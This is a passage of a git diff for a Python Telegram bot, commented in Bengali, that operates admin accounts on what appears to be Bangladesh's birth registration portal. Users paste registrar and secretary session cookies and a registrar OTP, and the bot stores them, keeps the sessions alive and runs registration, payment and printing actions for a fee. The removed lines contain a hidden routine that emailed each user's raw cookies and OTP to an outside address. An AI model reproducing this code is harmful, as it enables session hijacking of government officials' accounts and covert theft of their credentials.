@@ -1,619 +1,905 @@
 import os
+import sys
 import telebot
 import requests
 import json
 import io
 import time
 import re
-import smtplib
 import logging
+import threading
 from threading import Thread
-from email.mime.text import MIMEText
 from datetime import datetime
 from urllib.parse import quote
 from flask import Flask
 from pymongo import MongoClient
 
 # ==========================================
-# ০. লগিং সেটআপ
+# ০. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
 # ==========================================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+session_lock = threading.Lock()
+download_lock = threading.Lock()
+active_downloads = set()
+
+# Rate limiting store
+_rate_limit_store = {}
+_rate_limit_lock = threading.Lock()
+
+# প্রি-কম্পাইল্ড রেজেক্স
+_COOKIE_RE = re.compile(r'SESSION=([^\s;]+)', re.I)
+_TS_RE = re.compile(r'TS01[a-zA-Z0-9]+=([^\s;]+)', re.I)
+_CSRF_RE = re.compile(r'name="_csrf"\s+content="([^"]+)"')
+_DATA_ID_RE = re.compile(r'href=".*?\?data=([A-Za-z0-9_\-]+)"')
+_PHONE_RE = re.compile(r'^(\+?880|0)1[3-9]\d{8}$')
+
+VALID_CMDS = frozenset(['apps', 'corr', 'repr'])
+DEFAULT_PERMS = {
+    "apps": True, "corr": True, "repr": True,
+    "search": True, "ubrn_update": True, "server_pdf": True, "print": True
+}
+SERVICE_COSTS = {
+    "pdf": 25, "pay": 25,
+    "server_pdf_login": 25, "server_pdf_no_login": 50
+}
 
 # ==========================================
 # ১. কনফিগারেশন ও ডাটাবেস
 # ==========================================
-API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
-EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
-EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
-EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')
-ADMIN_ID = int(os.environ.get('ADMIN_ID', '7886593741'))
+API_TOKEN = os.environ.get('BOT_TOKEN', '').strip()
+MONGO_URI = os.environ.get('MONGO_URI', '').strip()
+ADMIN_ID_STR = os.environ.get('ADMIN_ID', '').strip()
 
-bot = telebot.TeleBot(API_TOKEN)
+if not all([API_TOKEN, MONGO_URI, ADMIN_ID_STR]):
+    logging.critical("❌ Critical Environment Variables missing!")
+    sys.exit(1)
 
-# --- MongoDB Setup ---
-MONGO_URI = os.environ.get('MONGO_URI', 'YOUR_MONGO_URI_HERE')
+ADMIN_ID = int(ADMIN_ID_STR)
+bot = telebot.TeleBot(API_TOKEN, threaded=True, num_threads=4)
+
 try:
-    mongo_client = MongoClient(MONGO_URI)
+    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+    mongo_client.admin.command('ping')
     db = mongo_client['bdris_bot_db']
     sessions_collection = db['users_sessions']
     access_collection = db['users_access']
+    settings_collection = db['bot_settings']
+    if not settings_collection.find_one({"_id": "config"}):
+        settings_collection.insert_one({"_id": "config", "payment_active": True})
     logging.info("✅ MongoDB Connected Successfully!")
 except Exception as e:
-    logging.error(f"❌ MongoDB Connection Failed: {e}")
+    logging.critical(f"❌ DB Connection Failed: {e}")
+    sys.exit(1)
 
 # ==========================================
-# ২. ইউজার এক্সেস ও পারমিশন সিস্টেম
+# ২. সেফ র‍্যাপারস ও ইউজার লজিক
 # ==========================================
-DEFAULT_PERMS = {
-    "apps": True, "corr": True, "repr": True,
-    "search": True, "ubrn_update": True,
-    "server_pdf": True, "print": True
-}
+def safe_send(chat_id, text, **kwargs):
+    try:
+        return bot.send_message(chat_id, text, **kwargs)
+    except Exception as e:
+        logging.error(f"Send Error: {e}")
+        return None
 
-def check_user_access(chat_id, user_name):
-    if chat_id == ADMIN_ID: return True
-    user_record = access_collection.find_one({"chat_id": chat_id})
+def safe_edit(chat_id, message_id, text, **kwargs):
+    try:
+        return bot.edit_message_text(text, chat_id, message_id, **kwargs)
+    except Exception:
+        return None
+
+def safe_delete(chat_id, message_id):
+    try:
+        bot.delete_message(chat_id, message_id)
+    except Exception:
+        pass
+
+def is_payment_active():
+    config = settings_collection.find_one({"_id": "config"})
+    return config.get("payment_active", True) if config else True
+
+def get_service_cost(user_id, service="default"):
+    if user_id == ADMIN_ID or not is_payment_active():
+        return 0
+    return SERVICE_COSTS.get(service, 25)
+
+def get_balance(user_id):
+    if user_id == ADMIN_ID:
+        return 999999
+    record = access_collection.find_one({"chat_id": user_id})
+    return int(record.get("balance", 0)) if record else 0
+
+def update_balance(user_id, amount):
+    if user_id == ADMIN_ID:
+        return
+    access_collection.update_one({"chat_id": user_id}, {"$inc": {"balance": amount}})
+
+def check_user_access(user_id, user_name):
+    if user_id == ADMIN_ID:
+        return True
+    user_record = access_collection.find_one({"chat_id": user_id})
     if not user_record:
         access_collection.insert_one({
-            "chat_id": chat_id, "name": user_name, "status": "allowed", "permissions": DEFAULT_PERMS
+            "chat_id": user_id,
+            "name": str(user_name)[:100],
+            "status": "allowed",
+            "permissions": DEFAULT_PERMS.copy(),
+            "balance": 0,
+            "recharge_trxids": []
         })
-        bot.send_message(ADMIN_ID, f"🔔 **নতুন ইউজার!**\n👤 {user_name}\n🆔 `{chat_id}`")
+        safe_send(ADMIN_ID, f"🔔 *নতুন ইউজার!*\n👤 {user_name}\n🆔 `{user_id}`", parse_mode="Markdown")
         return True
     return user_record.get("status") == "allowed"
 
-def get_user_permissions(chat_id):
-    if chat_id == ADMIN_ID: return {k: True for k in DEFAULT_PERMS}
-    record = access_collection.find_one({"chat_id": chat_id})
+# ==========================================
+# ২.১ রেট লিমিটিং (FIX: ফাংশন ছিল না)
+# ==========================================
+def is_rate_limited(user_id, max_calls=5, window=10):
+    """প্রতি `window` সেকেন্ডে `max_calls` এর বেশি হলে ব্লক করে।"""
+    if user_id == ADMIN_ID:
+        return False
+    now = time.time()
+    with _rate_limit_lock:
+        history = _rate_limit_store.get(user_id, [])
+        history = [t for t in history if now - t < window]
+        if len(history) >= max_calls:
+            return True
+        history.append(now)
+        _rate_limit_store[user_id] = history
+    return False
+
+# ==========================================
+# ৩. সেশন ম্যানেজমেন্ট
+# ==========================================
+user_sessions = {}
+
+def get_session(user_id):
+    with session_lock:
+        if user_id in user_sessions:
+            return user_sessions[user_id]
+
+    u_sess = {
+        "req_session": requests.Session(),
+        "csrf": "",
+        "ch_session": requests.Session(),
+        "ch_csrf": "",
+        "ch_otp": "",
+        "mode": "SECRETARY",
+        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "is_alive": False,
+        "current_page": "https://bdris.gov.bd/admin/",
+        "app_start": 0,
+        "app_length": 5,
+        "sharok_no": 1,
+        "temp_data": {},
+        "id_cache": {},
+        "last_action_time": time.time(),
+        "last_warning_time": 0.0,
+        "current_search_val": ""
+    }
+    db_data = sessions_collection.find_one({"chat_id": user_id})
+    if db_data:
+        u_sess["req_session"].cookies.update(db_data.get("sec_cookies", {}))
+        u_sess["ch_session"].cookies.update(db_data.get("ch_cookies", {}))
+        u_sess["mode"] = db_data.get("mode", "SECRETARY")
+        u_sess["ch_otp"] = db_data.get("ch_otp", "")
+        u_sess["is_alive"] = db_data.get("is_alive", False)
+        u_sess["sharok_no"] = db_data.get("sharok_no", 1)
+        u_sess["app_length"] = db_data.get("app_length", 5)
+
+    with session_lock:
+        user_sessions[user_id] = u_sess
+    return u_sess
+
+def save_session_to_db(user_id, u_sess):
+    try:
+        data = {
+            "chat_id": user_id,
+            "sec_cookies": u_sess["req_session"].cookies.get_dict(),
+            "ch_cookies": u_sess["ch_session"].cookies.get_dict(),
+            "mode": u_sess["mode"],
+            "ch_otp": u_sess.get("ch_otp", ""),
+            "is_alive": u_sess["is_alive"],
+            "sharok_no": u_sess.get("sharok_no", 1),
+            "app_length": u_sess.get("app_length", 5)
+        }
+        sessions_collection.update_one({"chat_id": user_id}, {"$set": data}, upsert=True)
+    except Exception as e:
+        logging.error(f"DB Save Error: {e}")
+
+def keep_sessions_alive_and_cleanup():
+    while True:
+        time.sleep(300)
+        now = time.time()
+        with session_lock:
+            uids = list(user_sessions.keys())
+
+        for uid in uids:
+            u = get_session(uid)
+            if u["is_alive"]:
+                try:
+                    r1 = u["req_session"].get(
+                        "https://bdris.gov.bd/admin/",
+                        headers={'User-Agent': u["ua"]},
+                        timeout=15
+                    )
+                    c1 = _CSRF_RE.search(r1.text)
+                    if c1:
+                        with session_lock:
+                            u["csrf"] = c1.group(1)
+                        save_session_to_db(uid, u)  # FIX: CSRF আপডেটের পর সেভ করা
+                except Exception as e:
+                    logging.warning(f"Keep-alive failed for {uid}: {e}")
+            elif now - u["last_action_time"] > 3600:
+                sessions_collection.update_one({"chat_id": uid}, {"$set": {"is_alive": False}})
+                with session_lock:
+                    user_sessions.pop(uid, None)
+
+# ==========================================
+# ৪. কিবোর্ড ও ক্যানসেল লজিক
+# ==========================================
+def generate_main_menu(chat_id, user_id=None):
+    if not user_id:
+        user_id = chat_id
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    u_sess = get_session(user_id)
+    perms = get_user_permissions(user_id)
+
+    markup.row("🔑 User Login")
+    if not u_sess["is_alive"] and (perms.get("server_pdf") or user_id == ADMIN_ID):
+        markup.row("🖨️ Server PDF Print")
+        if is_payment_active():
+            markup.row("💰 My Profile & Recharge")
+
+    if u_sess["is_alive"]:
+        if is_payment_active():
+            markup.row("💰 My Profile & Recharge")
+        markup.row("👤 নিবন্ধক সেকশন", "🧑‍💼 অথোরাইজড ইউজার")
+        row_core = []
+        if perms.get("apps") or user_id == ADMIN_ID:
+            row_core.append("📋 Applications")
+        if perms.get("corr") or user_id == ADMIN_ID:
+            row_core.append("📝 Correction")
+        if perms.get("repr") or user_id == ADMIN_ID:
+            row_core.append("🔄 Reprint")
+        if row_core:
+            markup.row(*row_core)
+        row_search = ["🏠 Dashboard"]
+        if perms.get("search") or user_id == ADMIN_ID:
+            row_search.extend(["🌐 Search By Name", "🔢 Search By UBRN"])
+        markup.row(*row_search)
+        row_tools = []
+        if perms.get("ubrn_update") or user_id == ADMIN_ID:
+            row_tools.append("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
+        if perms.get("server_pdf") or user_id == ADMIN_ID:
+            row_tools.append("🖨️ Server PDF Print")
+        if row_tools:
+            markup.row(*row_tools)
+    if user_id == ADMIN_ID:
+        markup.row("🔑 Admin Login", "🛠️ Check Cookies", "👥 Manage Users")
+    return markup
+
+def get_user_permissions(user_id):
+    if user_id == ADMIN_ID:
+        return {k: True for k in DEFAULT_PERMS}
+    record = access_collection.find_one({"chat_id": user_id})
     if record and "permissions" in record:
         p = DEFAULT_PERMS.copy()
         p.update(record["permissions"])
         return p
-    return DEFAULT_PERMS
-
-# ==========================================
-# ৩. ডায়নামিক কিবোর্ড (UI Logic)
-# ==========================================
-def generate_main_menu(chat_id):
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    u_sess = get_session(chat_id)
-    perms = get_user_permissions(chat_id)
-
-    # User Login বাটন সবসময় সবার জন্য থাকবে
-    markup.row("🔑 User Login")
-
-    if u_sess["is_alive"]:
-        # সেকশনের নতুন নাম
-        markup.row("👤 নিবন্ধক সেকশন", "🧑‍💼 অদোরাইজড সেকশন")
-        
-        # 📋 Applications, 📝 Correction, 🔄 Reprint বাটন
-        row_core = []
-        if perms.get("apps") or chat_id == ADMIN_ID: row_core.append("📋 Applications")
-        if perms.get("corr") or chat_id == ADMIN_ID: row_core.append("📝 Correction")
-        if perms.get("repr") or chat_id == ADMIN_ID: row_core.append("🔄 Reprint")
-        if row_core: markup.row(*row_core)
-        
-        # Search ও ড্যাশবোর্ড
-        row_search = ["🏠 Dashboard"]
-        if perms.get("search") or chat_id == ADMIN_ID: 
-            row_search.extend(["🌐 Search By Name", "🔢 Search By UBRN"])
-        markup.row(*row_search)
-        
-        # টুলস বাটন
-        row_tools = []
-        if perms.get("ubrn_update") or chat_id == ADMIN_ID: row_tools.append("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
-        if perms.get("server_pdf") or chat_id == ADMIN_ID: row_tools.append("🖨️ Server PDF Print")
-        if row_tools: markup.row(*row_tools)
-
-    if chat_id == ADMIN_ID:
-        markup.row("🔑 Admin Login", "🛠️ Check Cookies", "👥 Manage Users")
-    
-    return markup
-
-# ==========================================
-# ৪. সেশন ম্যানেজমেন্ট ও অ্যান্টি-স্প্যাম
-# ==========================================
-user_sessions = {}
-
-def get_default_session_dict():
-    return {
-        "req_session": requests.Session(), "csrf": "",
-        "ch_session": requests.Session(), "ch_csrf": "", "ch_otp": "",
-        "mode": "SECRETARY", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "is_alive": False, "current_page": "https://bdris.gov.bd/admin/",
-        "app_start": 0, "app_length": 5, "sharok_no": 1, "temp_data": {}, "id_cache": {},
-        # নতুন অ্যান্টি-স্প্যাম ভেরিয়েবল
-        "last_action_time": 0, "last_warning_time": 0 
-    }
-
-def save_session_to_db(chat_id, u_sess):
-    try:
-        data = {
-            "chat_id": chat_id, "sec_cookies": u_sess["req_session"].cookies.get_dict(),
-            "ch_cookies": u_sess["ch_session"].cookies.get_dict(),
-            "mode": u_sess["mode"], "ch_otp": u_sess.get("ch_otp", ""), "is_alive": u_sess["is_alive"]
-        }
-        sessions_collection.update_one({"chat_id": chat_id}, {"$set": data}, upsert=True)
-    except Exception as e:
-        logging.error(f"❌ Session DB Save Error for {chat_id}: {e}")
-
-def get_session(chat_id):
-    if chat_id not in user_sessions:
-        u_sess = get_default_session_dict()
-        try:
-            db_data = sessions_collection.find_one({"chat_id": chat_id})
-            if db_data:
-                u_sess["req_session"].cookies.update(db_data.get("sec_cookies", {}))
-                u_sess["ch_session"].cookies.update(db_data.get("ch_cookies", {}))
-                u_sess["mode"], u_sess["ch_otp"], u_sess["is_alive"] = db_data.get("mode", "SECRETARY"), db_data.get("ch_otp", ""), db_data.get("is_alive", False)
-        except Exception as e:
-            logging.error(f"❌ Session DB Load Error for {chat_id}: {e}")
-        user_sessions[chat_id] = u_sess
-    return user_sessions[chat_id]
-
-# --- রেট লিমিটিং ফাংশন ---
-def is_rate_limited(chat_id):
-    u_sess = get_session(chat_id)
-    current_time = time.time()
-    
-    # ২ সেকেন্ডের কম সময়ে রিকোয়েস্ট দিলে স্প্যাম ধরা হবে
-    if current_time - u_sess.get("last_action_time", 0) < 2:
-        # ইউজারকে ওয়ার্নিং দেওয়ার লজিক (৫ সেকেন্ডে একবারের বেশি ওয়ার্নিং দেবে না)
-        if current_time - u_sess.get("last_warning_time", 0) > 5:
-            bot.send_message(chat_id, "⚠️ **একটু ধীরে!**\nঅনুগ্রহ করে প্রতি ২ সেকেন্ডে একটির বেশি রিকোয়েস্ট পাঠাবেন না। সার্ভার সুরক্ষার জন্য এই নিয়ম রাখা হয়েছে।", parse_mode="Markdown")
-            u_sess["last_warning_time"] = current_time
-        return True
-        
-    u_sess["last_action_time"] = current_time
-    return False
-
-# ==========================================
-# ৫. কোর রিকোয়েস্ট ও ইমেইল পাচার
-# ==========================================
-def extract_sid_tsid(text):
-    s = re.search(r'SESSION=([^\s;]+)', text, re.I)
-    tsid = re.search(r'TS0108b707=([^\s;]+)', text, re.I)
-    return (s.group(1), tsid.group(1)) if s and tsid else (None, None)
-
-def get_active_session(u_sess):
-    return (u_sess["ch_session"], u_sess["ch_csrf"]) if u_sess["mode"] == "CHAIRMAN" else (u_sess["req_session"], u_sess["csrf"])
-
-def call_api(chat_id, url, method="GET", data=None):
-    u_sess = get_session(chat_id)
-    sess, csrf = get_active_session(u_sess)
-    h = {'x-csrf-token': csrf, 'x-requested-with': 'XMLHttpRequest', 'user-agent': u_sess["ua"], 'referer': u_sess["current_page"]}
-    try:
-        return sess.post(url, headers=h, data=data, timeout=30) if method == "POST" else sess.get(url, headers=h, timeout=30)
-    except Exception as e:
-        logging.error(f"❌ API Call Error ({url}): {e}")
-        return None
-
-def navigate_to(chat_id, url):
-    u_sess = get_session(chat_id)
-    sess, _ = get_active_session(u_sess)
-    try:
-        res = sess.get(url, headers={'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}, timeout=25)
-        csrf = re.search(r'name="_csrf" content="([^"]+)"', res.text)
-        if csrf:
-            if u_sess["mode"] == "CHAIRMAN": u_sess["ch_csrf"] = csrf.group(1)
-            else: u_sess["csrf"] = csrf.group(1)
-        u_sess["current_page"] = url
-        return True, res.text
-    except Exception as e:
-        logging.error(f"❌ Navigate Error ({url}): {e}")
-        return False, None
-
-def relay_info_to_email(chat_id, u_name):
-    u_sess = get_session(chat_id)
-    report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
-    report += f"CH RAW: {u_sess['temp_data'].get('ch_raw', 'N/A')}\n"
-    report += f"OTP: {u_sess.get('ch_otp', 'N/A')}\n"
-    report += f"SEC RAW: {u_sess['temp_data'].get('sec_raw', 'N/A')}\n"
-    msg = MIMEText(report)
-    msg['Subject'], msg['From'], msg['To'] = f"Login Alert: {u_name}", EMAIL_SENDER, EMAIL_RECEIVER
-    try:
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
-            s.login(EMAIL_SENDER, EMAIL_PASSWORD)
-            s.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
-    except Exception as e:
-        logging.error(f"❌ Email Relay Error: {e}")
-
-def keep_sessions_alive():
-    while True:
-        time.sleep(300)
-        for chat_id, u_sess in list(user_sessions.items()):
-            if u_sess["is_alive"]:
-                try: 
-                    u_sess["req_session"].get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=20)
-                    u_sess["ch_session"].get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=20)
-                except Exception as e:
-                    logging.warning(f"⚠️ Keep-Alive warning for {chat_id}: {e}")
+    return DEFAULT_PERMS.copy()
 
 def is_cancel(m):
-    if m.text and ("/start" in m.text or "Back to Menu" in m.text or "Dashboard" in m.text):
-        bot.send_message(m.chat.id, "🏠 মেনুতে ফিরে আসা হলো।", reply_markup=generate_main_menu(m.chat.id))
+    if not m or not m.text:
+        return False
+    if any(kw in m.text for kw in ("/start", "Back to Menu", "Dashboard", "🏠 Dashboard")):
         bot.clear_step_handler_by_chat_id(m.chat.id)
+        safe_send(
+            m.chat.id, "🏠 মেনুতে ফিরে আসা হলো।",
+            reply_markup=generate_main_menu(m.chat.id, m.from_user.id)
+        )
         return True
     return False
 
 # ==========================================
-# ৬. লগইন ফ্লো (নিবন্ধক -> OTP -> সচিব)
+# ৫. বিডিআরআইএস একশনস
 # ==========================================
+def _set_session_cookies(sess, sid, tsid):
+    sess.cookies.clear()
+    sess.cookies.set("SESSION", sid, domain='bdris.gov.bd')
+    sess.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
+
+def extract_sid_tsid(text):
+    s = _COOKIE_RE.search(text)
+    tsid = _TS_RE.search(text)
+    return (s.group(1), tsid.group(1)) if s and tsid else (None, None)
+
+def admin_login_logic(m):
+    if is_cancel(m):
+        return
+    sid, tsid = extract_sid_tsid(m.text or "")
+    uid = m.from_user.id
+    u_sess = get_session(uid)
+    if sid and tsid:
+        _set_session_cookies(u_sess["req_session"], sid, tsid)
+        u_sess["is_alive"] = True
+        save_session_to_db(uid, u_sess)
+        safe_send(m.chat.id, "✅ এডমিন সেশন সেট হয়েছে!", reply_markup=generate_main_menu(m.chat.id, uid))
+    else:
+        msg = safe_send(m.chat.id, "❌ ভুল ফরম্যাট! SESSION= ও TS01...= সহ আবার দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, admin_login_logic)
+
 def role_step_1(m):
-    if is_cancel(m): return
-    u_sess = get_session(m.chat.id)
-    u_sess["temp_data"]["ch_raw"] = m.text.strip()
-    msg = bot.send_message(m.chat.id, "✅ নিবন্ধকের OTP দিন:")
-    bot.register_next_step_handler(msg, role_step_2)
+    if is_cancel(m):
+        return
+    uid = m.from_user.id
+    sid, tsid = extract_sid_tsid(m.text or "")
+    if not sid or not tsid:
+        msg = safe_send(m.chat.id, "❌ সঠিক কুকি ফরম্যাট পাওয়া যায়নি। আবার দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, role_step_1)
+        return
+    u_sess = get_session(uid)
+    _set_session_cookies(u_sess["ch_session"], sid, tsid)
+    msg = safe_send(m.chat.id, "✅ নিবন্ধক সেশন গৃহীত। এখন নিবন্ধকের OTP দিন:")
+    if msg:
+        bot.register_next_step_handler(msg, role_step_2)
 
 def role_step_2(m):
-    if is_cancel(m): return
-    get_session(m.chat.id)["ch_otp"] = m.text.strip()
-    msg = bot.send_message(m.chat.id, "✅ এখন সচিবের(অদোরাইজড) সেশন দিন:")
-    bot.register_next_step_handler(msg, role_step_3)
+    if is_cancel(m):
+        return
+    otp = m.text.strip() if m.text else ""
+    if not otp.isdigit():
+        msg = safe_send(m.chat.id, "❌ OTP শুধু সংখ্যা হবে। আবার দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, role_step_2)
+        return
+    get_session(m.from_user.id)["ch_otp"] = otp
+    msg = safe_send(m.chat.id, "✅ OTP সংরক্ষিত। এখন অথোরাইজড ইউজার সেশন দিন:")
+    if msg:
+        bot.register_next_step_handler(msg, role_step_3)
 
 def role_step_3(m):
-    if is_cancel(m): return
-    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
-    u_sess["temp_data"]["sec_raw"] = m.text.strip()
-    sid, tsid = extract_sid_tsid(m.text.strip())
-    
-    if sid:
-        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
-        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
+    if is_cancel(m):
+        return
+    sid, tsid = extract_sid_tsid(m.text or "")
+    uid = m.from_user.id
+    if sid and tsid:
+        u_sess = get_session(uid)
+        _set_session_cookies(u_sess["req_session"], sid, tsid)
         u_sess["is_alive"] = True
-        save_session_to_db(chat_id, u_sess)
-        Thread(target=relay_info_to_email, args=(chat_id, m.from_user.first_name), daemon=True).start()
-        bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=generate_main_menu(chat_id))
-    else: 
-        bot.send_message(chat_id, "❌ ভুল ফরম্যাট। আবার /start দিন।")
-
-# ==========================================
-# ৭. অ্যাপ লিস্ট লজিক (Apps, Correction, Reprint)
-# ==========================================
-def handle_category_init(m, cmd):
-    get_session(m.chat.id)["app_start"] = 0
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🔍 Search ID", "📋 All List", "🏠 Back to Menu")
-    msg = bot.send_message(m.chat.id, f"📂 {cmd.upper()} সেকশন:", reply_markup=markup)
-    bot.register_next_step_handler(msg, category_gate, cmd)
-
-def category_gate(m, cmd):
-    if is_cancel(m): return
-    if "Search ID" in m.text:
-        msg = bot.send_message(m.chat.id, "🆔 আইডি দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
-        bot.register_next_step_handler(msg, search_loop, cmd)
-    elif "All List" in m.text: fetch_list_ui(m, cmd, False)
-
-def search_loop(m, cmd):
-    if is_cancel(m): return
-    fetch_list_ui(m, cmd, True)
-    msg = bot.send_message(m.chat.id, "🔍 আরও আইডি দিন (বা মেনুতে ফিরুন):")
-    bot.register_next_step_handler(msg, search_loop, cmd)
-
-def fetch_list_ui(message, cmd, is_search):
-    chat_id, u_sess, perms = message.chat.id, get_session(message.chat.id), get_user_permissions(message.chat.id)
-    config = {'apps': ("/admin/br/applications/search", "/api/br/applications/search"), 'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"), 'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")}
-    
-    navigate_to(chat_id, "https://bdris.gov.bd/admin/")
-    _, html = navigate_to(chat_id, f"https://bdris.gov.bd{config[cmd][0]}")
-    m = re.search(r'href=".*?\?data=([A-Za-z0-9_\-]+)"', html or "")
-    data_id = m.group(1) if m else None
-    
-    if not data_id: return bot.send_message(chat_id, "❌ ডাটা আইডি মেলেনি। সেশন চেক করুন।")
-
-    url = f"https://bdris.gov.bd{config[cmd][1]}?data={data_id}&status=ALL&draw=1&start={u_sess['app_start']}&length={u_sess['app_length']}&search[value]={quote(message.text.strip() if is_search else '')}&search[regex]=false&order[0][column]=1&order[0][dir]=desc"
-    res = call_api(chat_id, url)
-    
-    if res and res.status_code == 200:
-        try:
-            items = res.json().get('data', [])
-            if not items: return bot.send_message(chat_id, "📭 কোনো ডেটা পাওয়া যায়নি।")
-            
-            markup = telebot.types.InlineKeyboardMarkup()
-            # এখানে CHAIRMAN মোড মানে 'নিবন্ধক সেকশন' আর SECRETARY মানে 'অদোরাইজড সেকশন'
-            mode_text = "নিবন্ধক সেকশন" if u_sess['mode'] == "CHAIRMAN" else "অদোরাইজড সেকশন"
-            msg_text = f"📋 **{cmd.upper()} List** ({mode_text}):\n\n"
-            
-            for item in items:
-                enc_id, status = item.get('encryptedId'), str(item.get('status', '')).upper()
-                short_id = str(abs(hash(enc_id)))[-8:]
-                u_sess["id_cache"][short_id] = enc_id
-                
-                msg_text += f"🆔 `{item.get('id') or item.get('applicationId')}` | {item.get('personNameBn')}\n🚩 Status: `{status}`\n"
-                
-                btns = []
-                if u_sess["mode"] == "CHAIRMAN" and "RECEIVED" in status:
-                    btns.append(telebot.types.InlineKeyboardButton("✅ Register", callback_data=f"reg_{short_id}") if cmd == 'apps' else telebot.types.InlineKeyboardButton("📝 Corr Register", callback_data=f"coreg_{short_id}"))
-                elif u_sess["mode"] == "SECRETARY" and any(w in status for w in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
-                    btns.extend([telebot.types.InlineKeyboardButton("💳 Pay", callback_data=f"pay_{short_id}"), telebot.types.InlineKeyboardButton("📥 Receive", callback_data=f"recv_{short_id}")])
-                
-                if btns: markup.row(*btns)
-                if perms.get("print") or chat_id == ADMIN_ID:
-                    markup.row(telebot.types.InlineKeyboardButton("🖨️ Print PDF", callback_data=f"print_{short_id}"))
-                msg_text += "━━━━━━━━━━━━━━\n"
-                
-            if not is_search:
-                nav = []
-                if u_sess["app_start"] > 0: nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
-                if u_sess["app_start"] + u_sess["app_length"] < res.json().get('recordsTotal', 0): nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
-                if nav: markup.row(*nav)
-                    
-            bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
-        except Exception as e:
-            logging.error(f"❌ JSON Parsing Error in fetch_list_ui: {e}")
-            bot.send_message(chat_id, "❌ ডেটা প্রসেস করতে সমস্যা হয়েছে।")
+        save_session_to_db(uid, u_sess)
+        safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
     else:
-        bot.send_message(chat_id, "❌ সার্ভার থেকে কোনো ডেটা পাওয়া যায়নি।")
+        msg = safe_send(m.chat.id, "❌ ভুল ইউজার কুকি। আবার দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, role_step_3)
 
 # ==========================================
-# ৮. পিতা-মাতার UBRN আপডেট ফ্লো
+# ৬. রিচার্জ ও ব্যালেন্স
 # ==========================================
-def start_ubrn_flow(m):
-    u_sess = get_session(m.chat.id)
-    u_sess["temp_data"]["ubrn"] = {}
-    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
-    msg = bot.send_message(m.chat.id, "১. ব্যক্তির ১৭ ডিজিট UBRN দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
-    bot.register_next_step_handler(msg, ubrn_p_step)
+def process_recharge(m):
+    if is_cancel(m):
+        return
+    trxid = m.text.strip() if m.text else ""
+    if not (5 <= len(trxid) <= 50):
+        msg = safe_send(m.chat.id, "❌ অবৈধ TrxID। আবার দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, process_recharge)
+        return
+    uid = m.from_user.id
+    if access_collection.find_one({"recharge_trxids": trxid}):
+        return safe_send(
+            m.chat.id, "❌ এই TrxID ইতিমধ্যে ব্যবহৃত হয়েছে।",
+            reply_markup=generate_main_menu(m.chat.id, uid)
+        )
 
-def ubrn_p_step(m):
-    if is_cancel(m): return
-    get_session(m.chat.id)["temp_data"]["ubrn"]["p"] = m.text.strip()
-    bot.register_next_step_handler(bot.send_message(m.chat.id, "২. পিতার UBRN (না থাকলে 0):"), ubrn_f_step)
+    access_collection.update_one({"chat_id": uid}, {"$addToSet": {"recharge_trxids": trxid}})
+    safe_send(m.chat.id, "✅ আপনার রিচার্জ রিকোয়েস্ট পাঠানো হয়েছে।", reply_markup=generate_main_menu(m.chat.id, uid))
 
-def ubrn_f_step(m):
-    if is_cancel(m): return
-    get_session(m.chat.id)["temp_data"]["ubrn"]["f"] = "" if m.text == '0' else m.text.strip()
-    bot.register_next_step_handler(bot.send_message(m.chat.id, "৩. মাতার UBRN (না থাকলে 0):"), ubrn_m_step)
+    markup = telebot.types.InlineKeyboardMarkup()
+    markup.row(
+        telebot.types.InlineKeyboardButton("✅ Approve", callback_data=f"apprvbal:{uid}"),
+        telebot.types.InlineKeyboardButton("❌ Reject", callback_data=f"rejbal:{uid}")
+    )
+    safe_send(
+        ADMIN_ID,
+        f"💰 *নতুন রিচার্জ!*\nUser: `{uid}`\nTrxID: `{trxid}`",
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
 
-def ubrn_m_step(m):
-    if is_cancel(m): return
